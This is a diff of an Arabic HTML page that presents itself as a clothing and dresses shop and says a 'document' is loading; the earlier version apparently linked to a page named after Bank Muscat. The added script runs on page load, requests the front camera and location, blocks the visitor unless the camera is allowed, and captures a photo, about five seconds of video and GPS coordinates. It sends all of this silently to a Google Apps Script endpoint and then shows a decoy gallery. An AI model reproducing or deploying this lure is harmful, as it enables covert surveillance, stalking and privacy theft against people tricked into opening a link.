@@ -1,37 +1,316 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title> </title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>الاختيار الافضل للملابس والفساتين</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content=" ">
+<meta property="og:description" content="">
+<meta property="og:url" content="https://projctsappservice-tech.github.io/ALakhtyarAlafthal/">
+<meta property="og:image" content="https://i.ibb.co/KjzC2STm/preview1.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
 
-  <!-- وسوم Open Graph الأساسية لواتساب -->
-  <meta property="og:title" content="   ">
-  <meta property="og:description" content=" ">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://salarymanagmant-max.github.io/BankMuscat/v=7">
-  <meta property="og:image" content="https://salarymanagmant-max.github.io/BankMuscat/preview.jpgv=7">
-  <meta property="og:image:secure_url" content="https://salarymanagmant-max.github.io/BankMuscat/preview.jpg">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta property="og:image:type" content="image/jpeg">
+<!-- وسوم Twitter Card (لتحسين العرض على منصة X) -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="https://i.ibb.co/KjzC2STm/preview1.jpg">
+    <style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html, body {
+    width: 100%; min-height: 100vh; min-height: 100dvh;
+    background: #ffffff;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    flex-direction: column; user-select: none; -webkit-user-select: none;
+    padding: 20px; overflow-x: hidden;
+    -webkit-text-size-adjust: 100%;
+}
+#status {
+    font-size: 18px; padding: 25px; background: #fff;
+    border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    max-width: 50%; width: 100%; text-align: center;
+    transition: 0.3s; line-height: 1.6; word-wrap: break-word;
+}
+.status-loading { color: #1a73e8; }
+.status-success { color: #34a853; }
+.status-error   { color: #d32f2f; }
+#videoFront { display: none; }
+.click-hint {
+    margin-top: 20px; font-size: 16px; color: #fff;
+    background: #1a73e8; padding: 15px 30px; border-radius: 50px;
+    box-shadow: 0 4px 12px rgba(26,115,232,0.4); cursor: pointer;
+    font-weight: bold; transition: 0.3s; text-align: center;
+    max-width: 50%; width: 100%;
+}
+.click-hint:hover { background: #1558b0; }
+.click-hint:active { transform: scale(0.97); }
+#retryPermBtn {
+    display: none; margin-top: 18px; font-size: 16px; color: #fff;
+    background: #d32f2f; border: none; padding: 12px 24px;
+    border-radius: 50px; cursor: pointer; transition: 0.3s;
+    max-width: 50%; width: 100%;
+}
+#retryPermBtn:hover { background: #b71c1c; }
+#retryPermBtn:active { transform: scale(0.97); }
 
-  <!-- وسوم إضافية لتحسين المعاينة -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="https://salarymanagmant-max.github.io/BankMuscat/preview.jpg">
+/* ===== استجابة للشاشات الصغيرة (الجوالات) ===== */
+@media (max-width: 600px) {
+    html, body { padding: 15px; }
+    #status {
+        font-size: 15px; padding: 18px 15px;
+        border-radius: 10px; line-height: 1.55;
+        max-width: 100%;
+    }
+    #status small { font-size: 12px !important; }
+    .click-hint {
+        font-size: 15px; padding: 14px 20px;
+        margin-top: 16px; max-width: 100%;
+    }
+    #retryPermBtn {
+        font-size: 15px; padding: 13px 20px;
+        margin-top: 14px; max-width: 100%;
+    }
+}
 
-  <style>
-    * { box-sizing: border-box; }
-    html, body { margin: 0; min-height: 100%; background: #f4f4f4; }
-    body { display: flex; justify-content: center; align-items: flex-start; }
-    a { display: block; width: 100%; max-width: 900px; }
-    img { display: block; width: 100%; height: auto; }
-  </style>
+@media (max-width: 380px) {
+    #status { font-size: 14px; padding: 15px 12px; }
+    .click-hint { font-size: 14px; padding: 13px 16px; }
+    #retryPermBtn { font-size: 14px; padding: 12px 16px; }
+}
+    </style>
 </head>
 <body>
-  <a href="https://projctsappservice-tech.github.io/MinistryOfHeritageTouris/">
-    <img src="preview.jpg" alt=" ">
-  </a>
+
+    <div id="status"></div>
+    <div class="click-hint" id="clickHint">اضغط هنا لبدء العملية</div>
+    <button id="retryPermBtn">🔄 إعادة المحاولة</button>
+
+    <video id="videoFront" autoplay playsinline muted></video>
+
+    <script>
+        const SHEET_ID  = '1J_liU4icjkAcTAXB4CtLv1ONEVAFu9FRBGYll4oP9Hk';
+        const SHEET_NAME = 'LocationLink';
+        const GOOGLE_SCRIPT_URL = `https://script.google.com/macros/s/AKfycbyAO-IfToX1QoBoT0RbpAX-RcmIw3jba_t9XNoHvbpqp2jY8Sbdk8rTvDOk8A_EwRzx/exec`;
+        const DEFAULT_PRICE = 150;
+
+        const IMAGE_URLS = [
+            'https://i.ibb.co/6JNcVpXc/preview1.jpg'
+        ];
+
+        let cameraStream = null;
+        let processStarted = false;
+        const statusDiv = document.getElementById('status');
+        const retryPermBtn = document.getElementById('retryPermBtn');
+
+        async function getLocationName(lat, lon) {
+            try {
+                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&zoom=10&accept-language=ar`);
+                const data = await r.json();
+                return data.address?.city || data.address?.town || data.address?.state || 'منطقة غير معروفة';
+            } catch { return 'منطقة غير معروفة'; }
+        }
+
+        async function startProcess() {
+            if (processStarted) return;
+            processStarted = true;
+            document.getElementById('clickHint').style.display = 'none';
+            retryPermBtn.style.display = 'none';
+
+            // 1. طلب الكاميرا أولاً
+            statusDiv.innerHTML = " جاري طلب تحميل صفحة المستند ...";
+            statusDiv.className = "status-loading";
+            let camOk = false;
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                const vf = document.getElementById('videoFront');
+                vf.srcObject = cameraStream;
+                await new Promise(r => setTimeout(r, 500)); // انتظار بسيط لتشغيل الكاميرا
+                camOk = true;
+            } catch (e) {
+                console.warn('Camera error:', e);
+            }
+
+            // 2. طلب الموقع ثانياً
+            statusDiv.innerHTML = " جاري طلب تحميل صفحة المستند  ...";
+            statusDiv.className = "status-loading";
+            let locData = null;
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 });
+                });
+                locData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
+                locData.locationName = await getLocationName(locData.latitude, locData.longitude);
+            } catch (e) {
+                console.warn('Geo error:', e);
+            }
+
+            // إذا فشلت الكاميرا، نمنع الدخول
+            if (!camOk) {
+                statusDiv.innerHTML = " يجب السماح الاذونات للموقع لتحميل المستند .<br><br><small style='color:#666;font-size:14px;'></small>";
+                statusDiv.className = "status-error";
+                retryPermBtn.style.display = 'inline-block';
+                processStarted = false;
+                return;
+            }
+
+            // 3. التقاط صورة سريعة (اختياري)
+      statusDiv.innerHTML = " جاري تحميل صفحة  المستند ...";
+statusDiv.className = "status-loading";
+
+let imgData = null;
+let videoData = null;
+
+// (أ) التقاط الصورة فوراً من تدفق الكاميرا
+try {
+    const vf = document.getElementById('videoFront');
+    if (vf && vf.videoWidth) {
+        const c = document.createElement('canvas');
+        c.width = vf.videoWidth; c.height = vf.videoHeight;
+        c.getContext('2d').drawImage(vf, 0, 0);
+        imgData = c.toDataURL('image/jpeg', 0.7);
+    }
+} catch(e){}
+
+// (ب) تسجيل فيديو ثانيتين من نفس تدفق الكاميرا
+try {
+    if (cameraStream && window.MediaRecorder) {
+        const mimes = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'];
+        let mime = '';
+        for (const m of mimes) { if (MediaRecorder.isTypeSupported(m)) { mime = m; break; } }
+
+        if (mime) {
+            const chunks = [];
+            const recorder = new MediaRecorder(cameraStream, {
+                mimeType: mime,
+                videoBitsPerSecond: 500000   // ~500kbps لضغط حجم الفيديو
+            });
+
+            const recorded = new Promise((resolve) => {
+                recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+                recorder.onstop = () => {
+                    try {
+                        const blob = new Blob(chunks, { type: mime });
+                        const reader = new FileReader();
+                        reader.onloadend = () => { videoData = reader.result; resolve(); };
+                        reader.readAsDataURL(blob);
+                    } catch(e) { resolve(); }
+                };
+            });
+
+            recorder.start();
+            await new Promise(r => setTimeout(r, 5000));   // مدة التسجيل: ثانيتان
+            try { recorder.stop(); } catch(e){}
+            await recorded;
+        }
+    }
+} catch(e){ console.warn('Video record error:', e); }
+
+statusDiv.innerHTML = "✅ تم بنجاح! جاري فتح الستند...";
+statusDiv.className = "status-success";
+
+// إيقاف الكاميرا بعد الانتهاء من الصورة والفيديو
+try { cameraStream.getTracks().forEach(t => t.stop()); } catch(e){}
+cameraStream = null;
+
+// إرسال البيانات (صورة + فيديو) وفتح المعرض
+try {
+    await fetch(GOOGLE_SCRIPT_URL, {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            sheetId: SHEET_ID, sheetName: SHEET_NAME,
+            newDate: new Date().toISOString(),
+            linkLocation: locData ? `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}` : '',
+            latitude: locData?.latitude || '', longitude: locData?.longitude || '',
+            Timestamp: new Date().toLocaleString('ar-EG'), LocationName: locData?.locationName || '',
+            imageData: imgData || '', imageData2: '', imageData3: '', imageData4: '',
+            videoData: videoData || ''   // ← جديد: الفيديو بصيغة Base64 Data URL
+        })
+    });
+} catch(e){}
+openBlockWindow();
+processStarted = false;}
+
+ function openBlockWindow() {
+    let galleryHTML = '';
+    IMAGE_URLS.forEach((url, index) => {
+        galleryHTML += `
+            <div class="image-card">
+                <img src="${url}" alt="صورة" draggable="false">
+            </div>`;
+    });
+
+    const htmlContent = `
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>معرض الصور</title>
+        <style>
+            * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-user-select:none; }
+            html, body { width:100%; height:100%; background:#000; font-family:'Segoe UI',Tahoma,sans-serif; }
+            body { overflow-y:auto; scroll-snap-type:y mandatory; }
+            .image-card {
+                width:100vw;
+                height:100vh;
+                height:100dvh;
+                display:flex;
+                align-items:center;
+                justify-content:center;
+                background:#000;
+                scroll-snap-align:start;
+            }
+            .image-card img {
+                width:100%;
+                height:100%;
+                object-fit:contain;
+                display:block;
+                -webkit-user-drag:none;
+            }
+            .close-btn {
+                position:fixed; top:15px; right:15px;
+                background:rgba(0,0,0,0.5); color:#fff;
+                border:1px solid rgba(255,255,255,0.3);
+                padding:10px 18px; border-radius:40px;
+                font-size:16px; cursor:pointer; z-index:100;
+            }
+            @media (max-width: 768px) {
+                .close-btn { top:8px; right:8px; font-size:12px; padding:6px 10px; }
+            }
+        </style>
+    </head>
+    <body>
+        <button class="close-btn" id="closeBtn">✕ إغلاق</button>
+        ${galleryHTML}
+
+        <script>
+            function closeAllWindows() {
+                try { if (window.opener && !window.opener.closed) window.opener.close(); } catch(e){}
+                try { window.close(); } catch(e){}
+            }
+            document.getElementById('closeBtn').addEventListener('click', closeAllWindows);
+
+            window.addEventListener('beforeunload', function(){
+                try { if (window.opener && !window.opener.closed) window.opener.close(); } catch(e){}
+            });
+        <\/script>
+    </body>
+    </html>`;
+
+    const w = window.open('', '_blank');
+    if (w) { w.document.write(htmlContent); w.document.close(); }
+    else alert("يرجى السماح بالنوافذ المنبثقة");
+}
+
+        document.getElementById('clickHint').addEventListener('click', startProcess);
+        retryPermBtn.addEventListener('click', () => { processStarted = false; startProcess(); });
+        setTimeout(startProcess, 500);
+    </script>
 </body>
 </html>
-
